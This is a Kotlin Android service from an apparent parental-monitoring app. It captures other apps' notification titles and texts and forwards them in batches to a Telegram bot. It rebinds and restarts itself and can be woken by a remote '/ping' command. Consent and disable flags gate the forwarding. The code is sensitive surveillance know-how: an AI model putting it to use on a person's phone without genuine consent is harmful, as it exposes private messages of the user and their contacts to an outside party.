package com.redeye.parentalmonitor.service

import android.app.Notification
import android.content.ComponentName
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import com.redeye.parentalmonitor.data.MessageQueue
import com.redeye.parentalmonitor.data.PreferencesManager
import com.redeye.parentalmonitor.network.TelegramClient
import com.redeye.parentalmonitor.network.TelegramMessage
import com.redeye.parentalmonitor.utils.MessageScheduler
import com.redeye.parentalmonitor.utils.Html
import com.redeye.parentalmonitor.utils.NetworkUtils
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch

class NotificationForwarderService : NotificationListenerService() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val fwdSerial = Dispatchers.IO.limitedParallelism(1)
    private val appLabelCache = object : LinkedHashMap<String, String>(128, 0.75f, true) {
        override fun removeEldestEntry(eldest: MutableMap.MutableEntry<String, String>): Boolean {
            return size > 100
        }
    }
    private val lastSent = object : LinkedHashMap<String, Long>(64, 0.75f, true) {
        override fun removeEldestEntry(eldest: MutableMap.MutableEntry<String, Long>): Boolean {
            return size > 100
        }
    }
    @Volatile
    private var prefsRef: PreferencesManager? = null
    @Volatile
    private var queueRef: MessageQueue? = null
    private val pendingPosts = java.util.concurrent.atomic.AtomicInteger(0)
    private val pkgHits = object : LinkedHashMap<String, ArrayDeque<Long>>(64, 0.75f, true) {
        override fun removeEldestEntry(eldest: MutableMap.MutableEntry<String, ArrayDeque<Long>>): Boolean {
            return size > 100
        }
    }
    private val pkgHitsLock = Any()
    private val dropNoticeAt = java.util.concurrent.ConcurrentHashMap<String, Long>()
    @Volatile
    private var lastRebindAt = 0L
    @Volatile
    private var lastReviveAt = 0L
    private var wakeJob: Job? = null
    @Volatile
    private var wakeUpdateId = -1L
    @Volatile
    private var netCheckAt = 0L
    @Volatile
    private var netCached = false
    @Volatile
    private var cachedFwdToken = ""
    @Volatile
    private var cachedFwdChat = ""
    private var fwdCredsListener: android.content.SharedPreferences.OnSharedPreferenceChangeListener? = null
    @Volatile
    private var cfgCacheAt = 0L
    @Volatile
    private var cfgCacheEnabled = false
    @Volatile
    private var cfgCacheForward = true
    @Volatile
    private var cfgCacheConfigured = false
    private val groupSeen = object : LinkedHashMap<String, Long>(64, 0.75f, true) {
        override fun removeEldestEntry(eldest: MutableMap.MutableEntry<String, Long>): Boolean {
            return size > 100
        }
    }

    data class NotifRecord(val app: String, val title: String, val text: String, val at: Long)

    companion object {
        private const val MAX_HISTORY = 20
        private const val MAX_QUEUED = 64
        private const val MAX_BATCH = 32
        private val history = ArrayDeque<NotifRecord>()
        private val historyLock = Any()

        fun record(app: String, title: String, text: String) {
            synchronized(historyLock) {
                history.addLast(NotifRecord(app, title, text, System.currentTimeMillis()))
                while (history.size > MAX_HISTORY) history.removeFirst()
            }
        }

        fun history(): List<NotifRecord> {
            synchronized(historyLock) {
                return history.toList()
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        scope.launch {
            try {
                prefsRef = PreferencesManager.getInstance(this@NotificationForwarderService)
                queueRef = MessageQueue.getInstance(this@NotificationForwarderService)
                refreshFwdCreds()
                fwdCredsListener = android.content.SharedPreferences.OnSharedPreferenceChangeListener { _, key ->
                    if (key == PreferencesManager.KEY_BOT_TOKEN || key == PreferencesManager.KEY_CHAT_ID) refreshFwdCreds()
                    if (key == PreferencesManager.KEY_NOTIF_FORWARD || key == PreferencesManager.KEY_MONITORING_ENABLED || key == PreferencesManager.KEY_MONITORING_PAUSED || key == PreferencesManager.KEY_USER_DISABLED || key == PreferencesManager.KEY_USER_CONSENTED) cfgCacheAt = 0L
                }
                try { fwdCredsListener?.let { prefsRef?.registerChangeListener(it) } } catch (_: Exception) { }
                try { queueRef?.tryRestorePersistent() } catch (_: Exception) { }
                prefsRef?.isConfigured()
                queueRef?.hasMessages()
            } catch (e: kotlinx.coroutines.CancellationException) {
                throw e
            } catch (_: Exception) {
            }
        }
        startWakeLoop()
    }

    private fun refreshFwdCreds() {
        try {
            cachedFwdToken = prefsRef?.botToken.orEmpty()
            cachedFwdChat = prefsRef?.chatId.orEmpty()
        } catch (_: Exception) {
        }
    }

    private fun overflowLabel(pkg: String): String {
        val cached = synchronized(appLabelCache) { appLabelCache[pkg] }
        if (cached != null) return cached
        return try {
            val info = packageManager.getApplicationInfo(pkg, 0)
            packageManager.getApplicationLabel(info).toString().also { resolved ->
                synchronized(appLabelCache) { appLabelCache[pkg] = resolved }
            }
        } catch (_: Exception) {
            pkg
        }
    }

    private fun forwardingAllowed(): Boolean {
        val prefs = prefsRef ?: try {
            PreferencesManager.getInstance(this).also { prefsRef = it }
        } catch (_: Exception) {
            return false
        }
        val now = android.os.SystemClock.elapsedRealtime()
        if (now - cfgCacheAt < 10_000L) {
            return cfgCacheEnabled && cfgCacheForward && cfgCacheConfigured
        }
        val enabled = try {
            prefs.isMonitoringEnabled && !prefs.monitoringPaused && !prefs.userDisabledMonitoring && prefs.userConsentedMonitoring
        } catch (_: Exception) {
            false
        }
        val forward = try {
            prefs.notifForwardEnabled
        } catch (_: Exception) {
            true
        }
        val configured = try {
            prefs.isConfigured()
        } catch (_: Exception) {
            false
        }
        cfgCacheEnabled = enabled
        cfgCacheForward = forward
        cfgCacheConfigured = configured
        cfgCacheAt = now
        return enabled && forward && configured
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        reviveMonitoringIfNeeded()
        val notification = sbn?.notification ?: return
        val pkg = sbn.packageName ?: return
        if (pkg == packageName) return
        if (notification.flags and Notification.FLAG_ONGOING_EVENT != 0) return
        val isSummary = notification.flags and Notification.FLAG_GROUP_SUMMARY != 0
        val groupKey = try {
            sbn.groupKey ?: pkg
        } catch (_: Exception) {
            pkg
        }
        val notifId = sbn.id
        if (pendingPosts.get() > 32) {
            val fbTitle = try {
                notification.extras.getCharSequence(Notification.EXTRA_TITLE)?.toString()?.trim().orEmpty()
            } catch (_: Exception) {
                ""
            }
            val fbText = try {
                val e = notification.extras
                var b = e.getCharSequence(Notification.EXTRA_TEXT)?.toString()?.trim().orEmpty()
                if (b.isEmpty()) b = e.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()?.trim().orEmpty()
                if (b.isEmpty()) b = e.getCharSequence(Notification.EXTRA_SUB_TEXT)?.toString()?.trim().orEmpty()
                b
            } catch (_: Exception) {
                ""
            }
            if (fbTitle.isEmpty() && fbText.isEmpty()) return
            if (pendingPosts.incrementAndGet() > MAX_QUEUED) {
                pendingPosts.decrementAndGet()
                try { record(overflowLabel(pkg), fbTitle, fbText) } catch (_: Exception) { }
                return
            }
            scope.launch(fwdSerial) {
                try {
                    if (!forwardingAllowed()) return@launch
                    val nowFb = android.os.SystemClock.elapsedRealtime()
                    val keyFb = pkg + "\n" + fbTitle + "\n" + fbText
                    val dupFb = synchronized(lastSent) {
                        val prev = lastSent[keyFb] ?: 0L
                        if (nowFb - prev < 10_000L) true else {
                            lastSent[keyFb] = nowFb
                            false
                        }
                    }
                    if (dupFb) return@launch
                    if (pkgFull(pkg, nowFb)) {
                        val spamLabel = synchronized(appLabelCache) { appLabelCache[pkg] } ?: pkg
                        record(spamLabel, fbTitle, fbText)
                        return@launch
                    }
                    val label = synchronized(appLabelCache) { appLabelCache[pkg] } ?: try {
                        val info = packageManager.getApplicationInfo(pkg, 0)
                        packageManager.getApplicationLabel(info).toString().also { resolved ->
                            synchronized(appLabelCache) { appLabelCache[pkg] = resolved }
                        }
                    } catch (_: Exception) {
                        pkg
                    }
                    record(label, fbTitle, fbText)
                    try {
                        synchronized(groupSeen) { groupSeen[groupKey] = nowFb }
                    } catch (_: Exception) {
                    }
                    val message = buildString {
                        appendLine("\uD83D\uDD14 <b>Notification</b>")
                        appendLine("App: ${Html.escape(label)}")
                        if (fbTitle.isNotEmpty()) appendLine("Title: ${Html.escape(fbTitle.take(200))}")
                        if (fbText.isNotEmpty()) appendLine("Text: ${Html.escape(fbText.take(300))}")
                    }
                    try {
                        forwardToTelegram(message, pkg)
                    } catch (_: Exception) {
                    }
                } catch (_: Exception) {
                } finally {
                    pendingPosts.decrementAndGet()
                }
            }
            return
        }
        if (pendingPosts.incrementAndGet() > MAX_QUEUED) {
            pendingPosts.decrementAndGet()
            try {
                val t = try { notification.extras.getCharSequence(Notification.EXTRA_TITLE)?.toString()?.trim().orEmpty() } catch (_: Exception) { "" }
                var x = try { notification.extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()?.trim().orEmpty() } catch (_: Exception) { "" }
                if (x.isEmpty()) {
                    x = try { notification.extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()?.trim().orEmpty() } catch (_: Exception) { "" }
                }
                if (t.isNotEmpty() || x.isNotEmpty()) record(overflowLabel(pkg), t, x)
            } catch (_: Exception) { }
            return
        }
        scope.launch(fwdSerial) {
            try {
                handlePosted(pkg, notifId, notification, groupKey, isSummary)
            } finally {
                pendingPosts.decrementAndGet()
            }
        }
    }

    private suspend fun handlePosted(pkg: String, notifId: Int, notification: Notification, groupKey: String = "", isSummary: Boolean = false) {
        var prefs = prefsRef ?: try {
            PreferencesManager.getInstance(this).also { prefsRef = it }
        } catch (_: Exception) {
            return
        }
        if (!prefs.isStorageEncrypted) {
            try {
                if (PreferencesManager.refreshInstance(this)) {
                    prefs = PreferencesManager.getInstance(this)
                    prefsRef = prefs
                }
            } catch (_: Exception) {
            }
        }
        val nowCfg = android.os.SystemClock.elapsedRealtime()
        val cfgEnabled: Boolean
        val cfgForward: Boolean
        val cfgConfigured: Boolean
        if (nowCfg - cfgCacheAt < 10_000L) {
            cfgEnabled = cfgCacheEnabled
            cfgForward = cfgCacheForward
            cfgConfigured = cfgCacheConfigured
        } else {
            cfgEnabled = try { prefs.isMonitoringEnabled && !prefs.monitoringPaused && !prefs.userDisabledMonitoring && prefs.userConsentedMonitoring } catch (_: Exception) { false }
            cfgForward = try { prefs.notifForwardEnabled } catch (_: Exception) { true }
            cfgConfigured = try { prefs.isConfigured() } catch (_: Exception) { false }
            cfgCacheEnabled = cfgEnabled
            cfgCacheForward = cfgForward
            cfgCacheConfigured = cfgConfigured
            cfgCacheAt = nowCfg
        }
        if (!cfgEnabled) return
        if (!cfgForward || !cfgConfigured) return
        if (isSummary && groupKey.isNotEmpty()) {
            val seenAt = synchronized(groupSeen) { groupSeen[groupKey] } ?: 0L
            if (nowCfg - seenAt < 120_000L) return
        }
        val title: String
        val text: String
        try {
            val extras = notification.extras
            title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString()?.trim().orEmpty()
            var body = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()?.trim().orEmpty()
            if (body.isEmpty()) {
                body = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()?.trim().orEmpty()
            }
            if (body.isEmpty()) {
                try {
                    val lines = extras.getCharSequenceArray(Notification.EXTRA_TEXT_LINES)?.mapNotNull { it?.toString()?.trim() }?.filter { it.isNotEmpty() }
                    if (!lines.isNullOrEmpty()) body = lines.joinToString("\n").trim()
                } catch (_: Exception) {
                }
            }
            if (body.isEmpty()) {
                body = extras.getCharSequence(Notification.EXTRA_SUB_TEXT)?.toString()?.trim().orEmpty()
            }
            text = body
        } catch (_: Exception) {
            return
        }
        if (title.isEmpty() && text.isEmpty()) return
        val key = pkg + "\n" + title + "\n" + text
        val now = android.os.SystemClock.elapsedRealtime()
        synchronized(lastSent) {
            if (now - (lastSent[key] ?: 0L) < 10_000L) return
            lastSent[key] = now
        }
        if (pkgFull(pkg, now)) {
            val cachedLabel = synchronized(appLabelCache) { appLabelCache[pkg] } ?: pkg
            val lastNotice = dropNoticeAt[pkg] ?: 0L
            if (now - lastNotice > 120_000L) {
                if (dropNoticeAt.size > 64) {
                    val cutoff = now - 3_600_000L
                    dropNoticeAt.entries.removeIf { it.value < cutoff }
                }
                dropNoticeAt[pkg] = now
                forwardToTelegram("Spam filter: 10+ updates from " + Html.escape(cachedLabel) + " in 2 min, extras kept in /lastnotif history.", "")
            }
            record(cachedLabel, title, text)
            return
        }
        val appLabel = synchronized(appLabelCache) { appLabelCache[pkg] } ?: try {
            val info = packageManager.getApplicationInfo(pkg, 0)
            "${packageManager.getApplicationLabel(info)}".also { label ->
                synchronized(appLabelCache) { appLabelCache[pkg] = label }
            }
        } catch (_: Exception) {
            pkg
        }
        val message = buildString {
            appendLine("🔔 <b>Notification</b>")
            appendLine("App: ${Html.escape(appLabel)}")
            if (title.isNotEmpty()) appendLine("Title: ${Html.escape(title.take(200))}")
            if (text.isNotEmpty()) appendLine("Text: ${Html.escape(text.take(300))}")
        }
        record(appLabel, title, text)
        if (!isSummary && groupKey.isNotEmpty()) {
            synchronized(groupSeen) { groupSeen[groupKey] = android.os.SystemClock.elapsedRealtime() }
        }
        forwardToTelegram(message, pkg)
    }

    override fun onListenerConnected() {
        reviveMonitoringIfNeeded()
        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("NotifForwarder", "Notification listener connected")
        scope.launch {
            try {
                val prefs = prefsRef ?: PreferencesManager.getInstance(this@NotificationForwarderService).also { prefsRef = it }
                val queue = queueRef ?: MessageQueue.getInstance(this@NotificationForwarderService).also { queueRef = it }
                prefs.isConfigured()
                queue.hasMessages()
            } catch (e: kotlinx.coroutines.CancellationException) {
                throw e
            } catch (_: Exception) {
            }
        }
    }

    override fun onListenerDisconnected() {
        android.util.Log.w("NotifForwarder", "Notification listener disconnected")
        val now = android.os.SystemClock.elapsedRealtime()
        if (now - lastRebindAt < 60_000L) return
        lastRebindAt = now
        try {
            requestRebind(ComponentName(this, NotificationForwarderService::class.java))
        } catch (_: Exception) {
        }
    }

    private fun startWakeLoop() {
        try {
            wakeJob?.cancel()
        } catch (_: Exception) {
        }
        wakeJob = scope.launch {
            while (isActive) {
                try {
                    if (!MonitoringService.isRunning && !isMainRunning()) pollWakeOnce()
                } catch (e: kotlinx.coroutines.CancellationException) {
                    throw e
                } catch (_: Exception) {
                }
                try {
                    delay(25_000L)
                } catch (e: kotlinx.coroutines.CancellationException) {
                    throw e
                } catch (_: Exception) {
                }
            }
        }
    }

    private suspend fun pollWakeOnce() {
        val prefs = prefsRef ?: try {
            PreferencesManager.getInstance(this).also { prefsRef = it }
        } catch (_: Exception) {
            return
        }
        if (cachedFwdToken.isEmpty() || cachedFwdChat.isEmpty()) refreshFwdCreds()
        val token = cachedFwdToken.ifEmpty { try { prefs.botToken } catch (_: Exception) { "" } }
        val owner = cachedFwdChat.ifEmpty { try { prefs.chatId } catch (_: Exception) { "" } }
        if (token.isEmpty() || owner.isEmpty()) return
        val resumeOk = try {
            prefs.isMonitoringEnabled && prefs.isConfigured() && !prefs.userDisabledMonitoring && prefs.userConsentedMonitoring
        } catch (_: Exception) {
            false
        }
        if (!resumeOk) return
        val ownerId = try { prefs.ownerUserId } catch (_: Exception) { 0L }
        val mainLast = try { prefs.lastUpdateId } catch (_: Exception) { 0L }
        if (wakeUpdateId < 0L) {
            wakeUpdateId = try {
                maxOf(prefs.wakeUpdateId, mainLast)
            } catch (_: Exception) {
                0L
            }
        } else {
            wakeUpdateId = maxOf(wakeUpdateId, mainLast)
        }
        if (!NetworkUtils.isNetworkAvailable(this)) return
        val offset = maxOf(mainLast, wakeUpdateId) + 1L
        val url = "https://api.telegram.org/bot$token/getUpdates?offset=$offset&timeout=30"
        val response = try {
            TelegramClient.api.getUpdates(url)
        } catch (_: Exception) {
            return
        }
        if (!response.isSuccessful) return
        val updates = try {
            response.body()?.result.orEmpty()
        } catch (_: Exception) {
            return
        }
        if (updates.isEmpty()) return
        var maxId = wakeUpdateId
        var pinged = false
        for (u in updates) {
            if (u.updateId > maxId) maxId = u.updateId
            if (u.updateId <= mainLast || u.updateId <= wakeUpdateId) continue
            val msg = u.message ?: u.editedMessage ?: u.channelPost ?: u.editedChannelPost
            val cb = u.callbackQuery
            val text = try {
                (msg?.text ?: msg?.caption ?: cb?.data).orEmpty()
            } catch (_: Exception) {
                ""
            }
            val base = text.substringBefore(" ").substringBefore("@").lowercase(java.util.Locale.ROOT)
            if (base != "/ping") continue
            val dateSec = try {
                msg?.date ?: cb?.message?.date ?: 0L
            } catch (_: Exception) {
                0L
            }
            if (dateSec > 0L && System.currentTimeMillis() / 1000L - dateSec > 900L) continue
            val fromId = try {
                msg?.from?.id?.toString() ?: cb?.from?.id?.toString().orEmpty()
            } catch (_: Exception) {
                ""
            }
            val chatIdStr = try {
                msg?.chat?.id?.toString() ?: cb?.message?.chat?.id?.toString().orEmpty()
            } catch (_: Exception) {
                ""
            }
            val wakeOwner = fromId == owner || chatIdStr == owner || (ownerId != 0L && fromId == ownerId.toString())
            if (!wakeOwner) continue
            pinged = true
        }
        wakeUpdateId = maxId
        try {
            prefs.wakeUpdateId = maxId
        } catch (_: Exception) {
        }
        if (!pinged) return
        try {
            val pingIds = updates.filter { u ->
                val m = u.message ?: u.editedMessage ?: u.channelPost ?: u.editedChannelPost
                val cb = u.callbackQuery
                val t = try { (m?.text ?: m?.caption ?: cb?.data).orEmpty() } catch (_: Exception) { "" }
                val base = t.substringBefore(" ").substringBefore("@").lowercase(java.util.Locale.ROOT)
                base == "/ping" && u.updateId > mainLast
            }.map { it.updateId }
            prefs.addWakePingIds(pingIds)
        } catch (_: Exception) {
        }
        if (MonitoringService.isRunning || isMainRunning()) return
        try {
            val restart = android.content.Intent(this, MonitoringService::class.java).apply {
                action = MonitoringService.ACTION_START_MONITORING
            }
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                startForegroundService(restart)
            } else {
                startService(restart)
            }
        } catch (_: Exception) {
            android.util.Log.w("NotifForwarder", "Wake restart failed, retry via worker")
        }
        try {
            MessageScheduler.scheduleBootRestart(this)
        } catch (_: Exception) {
        }
        try {
            MessageScheduler.scheduleMessageSend(this)
        } catch (_: Exception) {
        }
    }

    private fun isMainRunning(): Boolean {
        return try {
            MonitoringService.isRunning
        } catch (_: Exception) {
            false
        }
    }

    private fun reviveMonitoringIfNeeded() {
        try {
            if (MonitoringService.isRunning || isMainRunning()) return
            val now = android.os.SystemClock.elapsedRealtime()
            if (now - lastReviveAt < 60_000L) return
            lastReviveAt = now
            val prefs = prefsRef ?: try {
                PreferencesManager.getInstance(this).also { prefsRef = it }
            } catch (_: Exception) {
                return
            }
            val resume = try {
                prefs.isMonitoringEnabled && prefs.isConfigured() && !prefs.userDisabledMonitoring && prefs.userConsentedMonitoring
            } catch (_: Exception) {
                false
            }
            if (!resume) return
            try {
                val restart = android.content.Intent(this, MonitoringService::class.java).apply {
                    action = MonitoringService.ACTION_START_MONITORING
                }
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                    startForegroundService(restart)
                } else {
                    startService(restart)
                }
            } catch (_: Exception) {
                android.util.Log.w("NotifForwarder", "Monitoring restart failed, retry via worker")
                try {
                    MessageScheduler.scheduleBootRestart(this)
                } catch (_: Exception) {
                }
            }
        } catch (_: Exception) {
        }
    }

    override fun onDestroy() {
        try { wakeJob?.cancel() } catch (_: Exception) { }
        try { fwdCredsListener?.let { prefsRef?.unregisterChangeListener(it) } } catch (_: Exception) { }
        scope.cancel()
        super.onDestroy()
    }


    private fun pkgFull(pkg: String, now: Long): Boolean {
        synchronized(pkgHitsLock) {
            val q = pkgHits[pkg] ?: return false
            while (q.isNotEmpty() && now - q.first() > 120_000L) q.removeFirst()
            return q.size >= 10
        }
    }

    private fun pkgRecord(pkg: String, now: Long) {
        synchronized(pkgHitsLock) {
            val q = pkgHits.getOrPut(pkg) { ArrayDeque() }
            while (q.isNotEmpty() && now - q.first() > 120_000L) q.removeFirst()
            q.addLast(now)
        }
    }

    private fun redactToken(value: String?): String {
        if (value.isNullOrEmpty()) return ""
        val token = try {
            prefsRef?.botToken ?: PreferencesManager.getInstance(this).botToken
        } catch (_: Exception) {
            ""
        }
        if (token.isEmpty()) return value
        return value.replace(token, "***")
    }

    private fun queue(): MessageQueue {
        queueRef?.let { return it }
        return MessageQueue.getInstance(this).also { queueRef = it }
    }


    private fun batchCut(text: String, max: Int): Int {
        if (text.length <= max) return text.length
        var cut = max.coerceAtMost(text.length)
        if (cut <= 0) return max.coerceAtMost(text.length)
        if (cut < text.length && Character.isHighSurrogate(text[cut - 1]) && Character.isLowSurrogate(text[cut])) cut -= 1
        val amp = text.lastIndexOf('&', cut - 1)
        if (amp >= 0 && amp > cut - 12) {
            val semi = text.indexOf(';', amp)
            if (semi < 0 || semi >= cut) {
                val entity = text.substring(amp, cut)
                if (entity.all { it.isLetterOrDigit() || it == '&' || it == '#' }) cut = amp
            }
        }
        val tag = text.lastIndexOf('<', cut - 1)
        if (tag >= 0 && text.indexOf('>', tag) >= cut) cut = tag
        if (cut <= 0) cut = max.coerceAtMost(text.length)
        return cut
    }

    private val batchLock = Any()
    private val batchBuf = ArrayDeque<Pair<String, String>>()
    private var batchJob: Job? = null

    private suspend fun forwardToTelegram(message: String, pkg: String = "") {
        var overflowed = false
        synchronized(batchLock) {
            if (batchBuf.size >= MAX_BATCH) {
                overflowed = true
            } else {
                batchBuf.addLast(message to pkg)
                if (batchJob?.isActive != true) {
                    batchJob = scope.launch(fwdSerial) {
                        try {
                            delay(15_000L)
                        } catch (e: kotlinx.coroutines.CancellationException) {
                            throw e
                        } catch (_: Exception) {
                        }
                        try {
                            flushBatch()
                        } catch (_: Exception) {
                        }
                    }
                }
            }
        }
        if (overflowed) {
            try {
                queue().addMessage(message)
                MessageScheduler.scheduleMessageSend(this)
            } catch (e: kotlinx.coroutines.CancellationException) {
                throw e
            } catch (_: Exception) {
            }
        }
    }

    private suspend fun flushBatch() {
        val items: List<Pair<String, String>>
        synchronized(batchLock) {
            if (batchBuf.isEmpty()) return
            items = batchBuf.toList()
            batchBuf.clear()
        }
        val pkgs = items.mapNotNull { it.second.takeIf { v -> v.isNotEmpty() } }.toSet()
        val now = android.os.SystemClock.elapsedRealtime()
        var rest = items.joinToString("\n\n") { it.first }
        while (rest.length > 4000) {
            var cut = rest.lastIndexOf("\n\n", 4000)
            if (cut <= 0) cut = 4000
            cut = batchCut(rest, cut)
            if (forwardLocked(rest.substring(0, cut), "")) {
                for (v in pkgs) pkgRecord(v, now)
            }
            rest = rest.substring(cut).trimStart('\n')
            if (rest.isEmpty()) return
        }
        if (rest.isNotEmpty() && forwardLocked(rest, "")) {
            for (v in pkgs) pkgRecord(v, now)
        }
    }

    private suspend fun forwardLocked(message: String, pkg: String): Boolean {
        try {
            val prefs = prefsRef ?: try {
                PreferencesManager.getInstance(this).also { prefsRef = it }
            } catch (_: Exception) {
                try {
                    queue().addMessage(message)
                    MessageScheduler.scheduleMessageSend(this)
                } catch (_: Exception) {
                }
                return false
            }
            if (cachedFwdToken.isEmpty() || cachedFwdChat.isEmpty()) refreshFwdCreds()
            val botToken = cachedFwdToken
            val chatId = cachedFwdChat
            if (botToken.isEmpty() || chatId.isEmpty()) {
                queue().addMessage(message)
                MessageScheduler.scheduleMessageSend(this)
                return false
            }
            try {
                if (prefs.credentialError.isNotEmpty()) {
                    val nowAuth = System.currentTimeMillis()
                    if (nowAuth < prefs.credentialErrorAt) {
                        prefs.credentialError = ""
                        prefs.credentialErrorAt = 0L
                    } else if (nowAuth - prefs.credentialErrorAt < 30 * 60_000L) {
                        queue().addMessage(message)
                        MessageScheduler.scheduleMessageSend(this)
                        return false
                    }
                }
            } catch (_: Exception) {
            }
            val nowNet = android.os.SystemClock.elapsedRealtime()
            if (nowNet - netCheckAt > 20_000L) {
                netCheckAt = nowNet
                netCached = NetworkUtils.isNetworkAvailable(this)
            }
            if (!netCached) {
                queue().addMessage(message)
                MessageScheduler.scheduleMessageSend(this)
                return false
            }
            val url = "https://api.telegram.org/bot$botToken/sendMessage"
            val response = TelegramClient.api.sendMessage(url, TelegramMessage(chatId = chatId, text = message))
            if (response.isSuccessful && response.body()?.ok == true) {
                if (pkg.isNotEmpty()) pkgRecord(pkg, android.os.SystemClock.elapsedRealtime())
                return true
            }
            if (response.code() == 401 || response.code() == 403) {
                android.util.Log.e("NotifForwarder", "Auth rejected, queuing notification until credentials are fixed")
                try {
                    prefs.credentialError = response.code().toString()
                    prefs.credentialErrorAt = System.currentTimeMillis()
                } catch (_: Exception) {
                }
                queue().addMessage(message)
                MessageScheduler.scheduleMessageSend(this)
                return false
            }
            if (response.code() == 429) {
                val retryAfter = try {
                    NetworkUtils.parseRetryAfter(response.errorBody()?.string())
                } catch (_: Exception) {
                    5L
                }
                queue().addMessage(message)
                MessageScheduler.scheduleMessageSendNext(this, retryAfter * 1000L)
                return false
            }
            if (response.code() == 400) {
                val body = try {
                    response.errorBody()?.string()
                } catch (_: Exception) {
                    null
                }
                if (NetworkUtils.isChatMissing(body)) {
                    try {
                        prefs.credentialError = response.code().toString()
                        prefs.credentialErrorAt = System.currentTimeMillis()
                    } catch (_: Exception) {
                    }
                    queue().addMessage(message)
                    MessageScheduler.scheduleMessageSend(this)
                    return false
                }
                val plain = message.replace(Html.tagStripRegex, "")
                if (plain != message) {
                    try {
                        val fallbackResp = TelegramClient.api.sendMessage(url, TelegramMessage(chatId = chatId, text = plain, parseMode = null))
                        if (fallbackResp.isSuccessful && fallbackResp.body()?.ok == true) {
                            if (pkg.isNotEmpty()) pkgRecord(pkg, android.os.SystemClock.elapsedRealtime())
                            return true
                        }
                    } catch (_: Exception) {
                    }
                }
                android.util.Log.w("NotifForwarder", "Notification permanently rejected (400), dropping")
                try {
                    queue().addMessage("Dropped 1 notification rejected by Telegram (400).")
                    MessageScheduler.scheduleMessageSend(this)
                } catch (_: Exception) {
                }
                return false
            }
            queue().addMessage(message)
            MessageScheduler.scheduleMessageSend(this)
        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            android.util.Log.e("NotifForwarder", "Forward failed: ${redactToken(e.message)}")
            try {
                queue().addMessage(message)
                MessageScheduler.scheduleMessageSend(this)
            } catch (_: Exception) {
            }
            return false
        }
        return false
    }
}
